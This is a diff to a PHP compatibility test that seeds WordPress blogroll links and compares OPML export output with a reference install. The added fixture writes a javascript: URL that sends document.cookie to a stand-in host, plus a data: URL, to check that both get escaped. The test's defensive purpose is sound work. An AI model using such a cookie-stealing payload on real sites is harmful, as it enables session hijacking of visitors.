@@ -168,9 +168,13 @@ if ($live) {
             wp_insert_link(['link_url' => 'https://a.example.com/', 'link_name' => 'Alpha & <Co>', 'link_rss' => 'https://a.example.com/feed/', 'link_category' => [$terms[0]]]),
             wp_insert_link(['link_url' => 'https://b.example.com/', 'link_name' => 'Beta "quoted"', 'link_category' => [$terms[0]]]),
             wp_insert_link(['link_url' => 'https://h.example.com/', 'link_name' => 'Hidden', 'link_visible' => 'N', 'link_category' => [$terms[1]]]),
+            wp_insert_link(['link_url' => 'https://u.example.com/', 'link_name' => 'Unsafe', 'link_category' => [$terms[0]]]),
         ];
         global $wpdb;
         $wpdb->update($wpdb->links, ['link_updated' => '0000-00-00 00:00:00'], ['link_id' => $links[1]]);
+        // Addresses only a plugin or an import writing the table could store: escaped as addresses, as the reference does (the 2026-10-23 sweep).
+        $wpdb->update($wpdb->links, ['link_url' => 'javascript:fetch("//x/"+document.cookie)&a=1', 'link_rss' => 'data:text/html,<b>x</b>'], ['link_id' => $links[3]]);
+        $wpdb->update($wpdb->links, ['link_url' => 'https://b.example.com/a b?x=1&y=2', 'link_rss' => 'https://b.example.com/feed?a=1&b=2'], ['link_id' => $links[1]]);
         echo json_encode(['terms' => $terms, 'links' => $links]);
         PHP) . ' 2>/dev/null'), true);
     register_shutdown_function(static function () use ($wp, $made): void {
@@ -179,7 +183,7 @@ if ($live) {
         shell_exec($wp . ' eval ' . escapeshellarg('foreach (' . var_export($links, true) . ' as $id) { wp_delete_link($id); } foreach (' . var_export($terms, true) . ' as $id) { wp_delete_term($id, "link_category"); }') . ' 2>/dev/null');
     });
     $friends = (int) ($made['terms'][0] ?? 0);
-    $check($friends > 1 && count(array_filter((array) ($made['links'] ?? []))) === 3, 'links made on the reference for the OPML comparison', json_encode($made));
+    $check($friends > 1 && count(array_filter((array) ($made['links'] ?? []))) === 4, 'links made on the reference for the OPML comparison', json_encode($made));
     foreach (['', "?link_cat={$friends}", "?link_cat=-{$friends}x", '?link_cat=abc', '?link_cat=all'] as $query) {
         $ours = probe_normalise(probe_fetch($ENGINE, '/wp-links-opml.php' . $query)[2], $REF, $ENGINE);
         $theirs = probe_normalise(probe_fetch($REF, '/wp-links-opml.php' . $query)[2], $REF, $ENGINE);
